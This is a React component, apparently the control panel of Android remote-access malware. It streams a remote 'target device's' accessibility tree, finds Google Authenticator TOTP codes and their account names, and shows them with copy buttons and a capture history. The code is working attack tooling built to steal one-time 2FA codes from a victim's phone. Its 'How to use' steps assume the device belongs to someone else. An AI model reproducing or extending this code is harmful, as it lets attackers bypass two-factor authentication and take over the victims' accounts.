import React, { useState, useCallback, useEffect, useRef } from 'react';

const PHONE_W = 300;
const PHONE_H = 640;

function formatTime(ts) {
  if (!ts) return '';
  return new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

function formatDate(ts) {
  if (!ts) return '';
  const d = new Date(ts);
  const today = new Date();
  if (d.toDateString() === today.toDateString()) return 'Today';
  const yesterday = new Date(today);
  yesterday.setDate(today.getDate() - 1);
  if (d.toDateString() === yesterday.toDateString()) return 'Yesterday';
  return d.toLocaleDateString([], { month: 'short', day: 'numeric' });
}

// Extract OTP codes and associated account names from accessibility tree elements
function extractOtpCodes(elements) {
  if (!elements || !elements.length) return [];
  const codes = [];
  const OTP_RE = /\b(\d{6})\b/;
  // Build a sorted list to find labels near codes
  const elems = [...elements].filter(e => e.bounds);
  const sorted = [...elems].sort((a, b) => (a.bounds.top - b.bounds.top) || (a.bounds.left - b.bounds.left));

  sorted.forEach((el, idx) => {
    const text = (el.text || el.contentDescription || '').trim();
    const match = OTP_RE.exec(text);
    if (!match) return;
    const code = match[1];
    // Look for account name: scan nearby elements (within ~200px vertically)
    let account = '';
    for (let d = 1; d <= 4; d++) {
      const prev = sorted[idx - d];
      if (!prev) break;
      if (Math.abs((prev.bounds.bottom + prev.bounds.top) / 2 - (el.bounds.top + el.bounds.bottom) / 2) > 300) break;
      const t = (prev.text || prev.contentDescription || '').trim();
      if (t && !OTP_RE.test(t) && t.length > 2) { account = t; break; }
    }
    codes.push({ code, account, el });
  });
  return codes;
}

function renderPhoneElements(screenData, devW, devH) {
  if (!screenData) return null;
  const elements = (screenData.elements || []).filter(
    el => el.text || el.contentDescription || el.hintText || el.clickable || el.editable
  );
  const scX = PHONE_W / devW;
  const scY = PHONE_H / devH;

  const getStyle = (el) => {
    if (el.editable)  return { border: '1.5px solid #3b82f6', background: 'rgba(59,130,246,0.13)' };
    if (el.clickable) return { border: '1px solid rgba(34,197,94,0.5)', background: 'rgba(34,197,94,0.07)' };
    if (el.selected || el.checked) return { border: '1px solid rgba(234,179,8,0.5)', background: 'rgba(234,179,8,0.07)' };
    if (el.text || el.contentDescription) return { border: '1px solid rgba(148,163,184,0.14)', background: 'transparent' };
    return { border: '1px dashed rgba(100,116,139,0.1)', background: 'transparent' };
  };

  // OTP elements highlighted differently
  const OTP_RE = /\b\d{6}\b/;

  return [...elements]
    .filter(el => el.bounds)
    .sort((a, b) => {
      const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
      const aB = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
      return aB - aA;
    })
    .map((el, i) => {
      const left   = el.bounds.left * scX;
      const top    = el.bounds.top  * scY + 20;
      const width  = (el.bounds.right  - el.bounds.left) * scX;
      const height = (el.bounds.bottom - el.bounds.top)  * scY;
      if (width < 2 || height < 2) return null;
      const label = (el.text || el.contentDescription || el.hintText || '').slice(0, 32);
      const isOtp = OTP_RE.test(label);
      return (
        <div
          key={i}
          style={{
            position: 'absolute', left, top, width, height,
            ...(isOtp
              ? { border: '2px solid #a78bfa', background: 'rgba(167,139,250,0.18)', borderRadius: 4 }
              : getStyle(el)),
            borderRadius: 3, boxSizing: 'border-box', overflow: 'hidden',
            display: 'flex', alignItems: 'center', padding: '0 2px',
          }}
        >
          {height > 10 && label && (
            <span style={{
              fontSize: Math.min(Math.max(height * 0.36, 6.5), 9.5),
              color: isOtp ? '#c4b5fd' : el.editable ? '#93c5fd' : el.clickable ? '#86efac' : '#cbd5e1',
              whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis',
              lineHeight: 1.2, pointerEvents: 'none',
              fontWeight: isOtp ? 700 : el.clickable ? 600 : 400,
            }}>
              {label}
            </span>
          )}
        </div>
      );
    });
}

function CopyButton({ text }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(text).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 1800);
  };
  return (
    <button onClick={copy} style={{
      border: 'none', borderRadius: 6, padding: '4px 10px',
      background: copied ? 'rgba(34,197,94,0.2)' : 'rgba(167,139,250,0.15)',
      color: copied ? '#86efac' : '#c4b5fd',
      cursor: 'pointer', fontSize: 10, fontWeight: 700,
      transition: 'all 0.2s', flexShrink: 0,
    }}>
      {copied ? '✓ Copied' : 'Copy'}
    </button>
  );
}

// 30-second TOTP progress bar countdown
function TotpCountdown() {
  const [secs, setSecs] = useState(30 - (Math.floor(Date.now() / 1000) % 30));
  useEffect(() => {
    const id = setInterval(() => setSecs(30 - (Math.floor(Date.now() / 1000) % 30)), 500);
    return () => clearInterval(id);
  }, []);
  const pct = (secs / 30) * 100;
  const color = secs <= 5 ? '#ef4444' : secs <= 10 ? '#f59e0b' : '#22c55e';
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
      <div style={{ flex: 1, height: 3, background: '#1e293b', borderRadius: 2, overflow: 'hidden' }}>
        <div style={{ width: `${pct}%`, height: '100%', background: color, transition: 'width 0.5s linear, background 0.3s' }} />
      </div>
      <span style={{ fontSize: 10, color, fontWeight: 700, width: 20, textAlign: 'right' }}>{secs}s</span>
    </div>
  );
}

export default function GcodeAuthenticator({ device, sendCommand, results, screenReaderPushData }) {
  const deviceId = device?.deviceId;
  const isOnline = device?.isOnline;
  const info     = device?.deviceInfo || {};
  const devW     = info.screenWidth  || 1080;
  const devH     = info.screenHeight || 2340;

  // ── Capture state ────────────────────────────────────────────────────────
  const [capturing, setCapturing]         = useState(false);
  const [captures, setCaptures]           = useState([]);      // history of captures
  const [selectedIdx, setSelectedIdx]     = useState(null);    // which capture is shown
  const captureTimeoutRef                 = useRef(null);
  const isCapturingRef                    = useRef(false);

  // ── When streaming data arrives during a capture, grab it and stop ───────
  useEffect(() => {
    if (!isCapturingRef.current) return;
    if (!screenReaderPushData?.success || !screenReaderPushData?.screen) return;

    const screen = screenReaderPushData.screen;
    const codes  = extractOtpCodes(screen.elements || []);

    // Stop streaming immediately
    sendCommand(deviceId, 'screen_reader_stream_stop', {});
    if (captureTimeoutRef.current) clearTimeout(captureTimeoutRef.current);

    const entry = {
      id:        Date.now(),
      ts:        Date.now(),
      screen,
      codes,
      pkg:       screen.packageName || 'Unknown app',
    };

    setCaptures(prev => [entry, ...prev].slice(0, 20));
    setSelectedIdx(0);
    setCapturing(false);
    isCapturingRef.current = false;
  }, [screenReaderPushData, deviceId, sendCommand]);

  const startCapture = useCallback(() => {
    if (!isOnline || !deviceId || capturing) return;
    setCapturing(true);
    isCapturingRef.current = true;

    // Start screen reader stream at fast interval — grab next frame and stop
    sendCommand(deviceId, 'screen_reader_stream_start', { intervalMs: 400 });

    // Safety timeout: stop after 10s if no data arrives
    captureTimeoutRef.current = setTimeout(() => {
      if (isCapturingRef.current) {
        sendCommand(deviceId, 'screen_reader_stream_stop', {});
        setCapturing(false);
        isCapturingRef.current = false;
      }
    }, 10000);
  }, [isOnline, deviceId, capturing, sendCommand]);

  // Cleanup on unmount
  useEffect(() => () => {
    if (captureTimeoutRef.current) clearTimeout(captureTimeoutRef.current);
    if (isCapturingRef.current) sendCommand(deviceId, 'screen_reader_stream_stop', {});
  }, [deviceId, sendCommand]);

  const selectedCapture = selectedIdx !== null ? captures[selectedIdx] : null;

  return (
    <div style={{ display: 'flex', gap: 16, alignItems: 'flex-start', flexWrap: 'wrap' }}>

      {/* ── LEFT: Phone frame + capture button ── */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>

        {/* Capture button */}
        <button
          onClick={startCapture}
          disabled={!isOnline || capturing}
          style={{
            border: 'none', borderRadius: 10, padding: '10px 16px',
            background: capturing
              ? 'rgba(124,58,237,0.4)'
              : (!isOnline ? '#1e293b' : 'linear-gradient(135deg,#7c3aed,#4f46e5)'),
            color: (!isOnline && !capturing) ? '#475569' : '#f1f5f9',
            cursor: (!isOnline || capturing) ? 'not-allowed' : 'pointer',
            fontSize: 13, fontWeight: 700, display: 'flex', alignItems: 'center',
            gap: 8, justifyContent: 'center', transition: 'all 0.2s',
            boxShadow: (!isOnline || capturing) ? 'none' : '0 2px 12px rgba(124,58,237,0.35)',
          }}
        >
          {capturing
            ? <><span style={{ display: 'inline-block', animation: 'spin 0.7s linear infinite' }}>⏳</span> Capturing…</>
            : <><span>📷</span> Capture Authenticator Screen</>}
        </button>

        {capturing && (
          <div style={{ fontSize: 11, color: '#a78bfa', textAlign: 'center', padding: '4px 8px',
            background: 'rgba(124,58,237,0.08)', borderRadius: 6, border: '1px solid rgba(124,58,237,0.2)' }}>
            Open Google Authenticator — grabbing screen now…
          </div>
        )}

        {/* Phone frame */}
        <div style={{
          background: '#1a1f2e', borderRadius: 28, padding: '14px 10px 12px',
          border: selectedCapture ? '2px solid #7c3aed' : '2px solid #2d2d4e',
          display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8,
          boxShadow: selectedCapture ? '0 0 24px rgba(124,58,237,0.18)' : '0 4px 20px rgba(0,0,0,0.4)',
        }}>
          {/* Top notch */}
          <div style={{ width: 56, height: 5, background: '#2d2d4e', borderRadius: 4 }} />

          {/* Screen */}
          <div style={{
            width: PHONE_W, height: PHONE_H,
            background: selectedCapture ? '#0d1117' : '#0a0f1e',
            borderRadius: 8, border: '1px solid #1e293b',
            overflow: 'hidden', position: 'relative',
          }}>
            {!selectedCapture && (
              <div style={{
                display: 'flex', flexDirection: 'column', alignItems: 'center',
                justifyContent: 'center', height: '100%', gap: 12,
              }}>
                <div style={{ fontSize: 42, opacity: 0.2 }}>🔐</div>
                <div style={{ fontSize: 11, color: '#334155', textAlign: 'center', lineHeight: 1.8, padding: '0 24px' }}>
                  Open Google Authenticator<br />then click Capture
                </div>
              </div>
            )}

            {selectedCapture?.screen && (() => {
              return (
                <>
                  {/* Status bar */}
                  <div style={{
                    position: 'absolute', top: 0, left: 0, right: 0, height: 20,
                    background: 'rgba(0,0,0,0.9)', display: 'flex', alignItems: 'center',
                    padding: '0 8px', zIndex: 50, gap: 6,
                  }}>
                    <div style={{ width: 5, height: 5, borderRadius: '50%', background: '#a78bfa', flexShrink: 0 }} />
                    <span style={{ fontSize: 8, color: '#94a3b8', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                      {selectedCapture.pkg}
                    </span>
                    <span style={{ fontSize: 7, color: '#475569' }}>
                      {selectedCapture.screen.elementCount ?? (selectedCapture.screen.elements?.length ?? 0)} nodes
                    </span>
                  </div>
                  {renderPhoneElements(selectedCapture.screen, devW, devH)}
                </>
              );
            })()}
          </div>

          {/* Bottom bar */}
          <div style={{ width: 60, height: 4, background: '#2d2d4e', borderRadius: 4 }} />
        </div>

        {selectedCapture && (
          <div style={{ fontSize: 10, color: '#475569', textAlign: 'center' }}>
            {formatDate(selectedCapture.ts)} {formatTime(selectedCapture.ts)}
          </div>
        )}
      </div>

      {/* ── RIGHT: Extracted codes + capture history ── */}
      <div style={{ flex: 1, minWidth: 260, display: 'flex', flexDirection: 'column', gap: 10 }}>

        {/* OTP codes panel */}
        {selectedCapture && selectedCapture.codes.length > 0 && (
          <div style={{ background: '#16213e', border: '1px solid #7c3aed44', borderRadius: 12, padding: '14px 16px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
              <span style={{ fontSize: 16 }}>🔑</span>
              <div style={{ flex: 1 }}>
                <div style={{ fontSize: 12, fontWeight: 700, color: '#e2e8f0' }}>Extracted 2FA Codes</div>
                <div style={{ fontSize: 10, color: '#64748b', marginTop: 1 }}>
                  {selectedCapture.codes.length} code{selectedCapture.codes.length !== 1 ? 's' : ''} found · TOTP refreshes every 30s
                </div>
              </div>
            </div>

            {/* TOTP countdown */}
            <TotpCountdown />

            <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginTop: 12 }}>
              {selectedCapture.codes.map((item, i) => (
                <div key={i} style={{
                  background: '#0f172a', borderRadius: 10, padding: '12px 14px',
                  border: '1px solid rgba(167,139,250,0.2)',
                  display: 'flex', alignItems: 'center', gap: 10,
                }}>
                  <div style={{ flex: 1 }}>
                    {item.account && (
                      <div style={{ fontSize: 10, color: '#64748b', marginBottom: 3, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                        {item.account}
                      </div>
                    )}
                    <div style={{ fontSize: 22, fontWeight: 800, color: '#c4b5fd', letterSpacing: '0.18em', fontFamily: 'monospace' }}>
                      {item.code.slice(0, 3)} {item.code.slice(3)}
                    </div>
                  </div>
                  <CopyButton text={item.code} />
                </div>
              ))}
            </div>
          </div>
        )}

        {selectedCapture && selectedCapture.codes.length === 0 && (
          <div style={{ background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 12, padding: '16px', textAlign: 'center' }}>
            <div style={{ fontSize: 24, opacity: 0.3, marginBottom: 6 }}>🔐</div>
            <div style={{ fontSize: 12, color: '#64748b', fontWeight: 600 }}>No 6-digit codes found</div>
            <div style={{ fontSize: 10, color: '#334155', marginTop: 4, lineHeight: 1.6 }}>
              Make sure Google Authenticator is open and visible, then capture again.
            </div>
          </div>
        )}

        {/* Capture history */}
        <div style={{ background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 12, padding: '14px 16px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: captures.length > 0 ? 12 : 0 }}>
            <span style={{ fontSize: 15 }}>🕐</span>
            <div style={{ flex: 1 }}>
              <div style={{ fontSize: 12, fontWeight: 700, color: '#e2e8f0' }}>Capture History</div>
              <div style={{ fontSize: 10, color: '#64748b', marginTop: 1 }}>
                {captures.length > 0 ? `${captures.length} capture${captures.length !== 1 ? 's' : ''} this session` : 'No captures yet this session'}
              </div>
            </div>
          </div>

          {captures.length === 0 && (
            <div style={{ fontSize: 11, color: '#334155', textAlign: 'center', padding: '18px 0', lineHeight: 1.7 }}>
              Captures are stored in memory for this session.<br />
              Click "Capture" to grab 2FA codes.
            </div>
          )}

          {captures.length > 0 && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
              {captures.map((cap, idx) => {
                const isActive = idx === selectedIdx;
                return (
                  <div
                    key={cap.id}
                    onClick={() => setSelectedIdx(idx)}
                    style={{
                      background: '#0f172a', borderRadius: 8,
                      border: `1px solid ${isActive ? '#7c3aed' : '#1e293b'}`,
                      padding: '8px 12px', cursor: 'pointer',
                      display: 'flex', alignItems: 'center', gap: 10,
                      transition: 'border-color 0.15s',
                    }}
                  >
                    <span style={{ fontSize: 14 }}>{cap.codes.length > 0 ? '🔑' : '📋'}</span>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{
                        fontSize: 11, color: isActive ? '#c4b5fd' : '#94a3b8',
                        fontWeight: isActive ? 600 : 400,
                        overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
                      }}>
                        {cap.codes.length > 0
                          ? `${cap.codes.length} code${cap.codes.length !== 1 ? 's' : ''} — ${cap.pkg}`
                          : cap.pkg}
                      </div>
                      <div style={{ fontSize: 9, color: '#475569', marginTop: 1 }}>
                        {formatDate(cap.ts)} {formatTime(cap.ts)}
                      </div>
                    </div>
                    {cap.codes.length > 0 && (
                      <span style={{
                        fontSize: 9, background: 'rgba(124,58,237,0.2)', color: '#a78bfa',
                        border: '1px solid rgba(124,58,237,0.3)', borderRadius: 4, padding: '2px 6px', fontWeight: 700,
                      }}>
                        {cap.codes.length}
                      </span>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </div>

        {/* Instructions */}
        <div style={{ background: 'rgba(124,58,237,0.06)', border: '1px solid rgba(124,58,237,0.15)', borderRadius: 10, padding: '12px 14px' }}>
          <div style={{ fontSize: 11, color: '#7c3aed', fontWeight: 700, marginBottom: 6 }}>How to use</div>
          <ol style={{ margin: 0, paddingLeft: 16, color: '#64748b', fontSize: 10, lineHeight: 1.9 }}>
            <li>Open Google Authenticator on the target device</li>
            <li>Click <b style={{ color: '#a78bfa' }}>Capture Authenticator Screen</b></li>
            <li>The screen reader grabs the view and stops immediately</li>
            <li>6-digit TOTP codes appear above with one-click copy</li>
          </ol>
        </div>

      </div>

      <style>{`
        @keyframes spin { from { transform: rotate(0deg) } to { transform: rotate(360deg) } }
      `}</style>
    </div>
  );
}
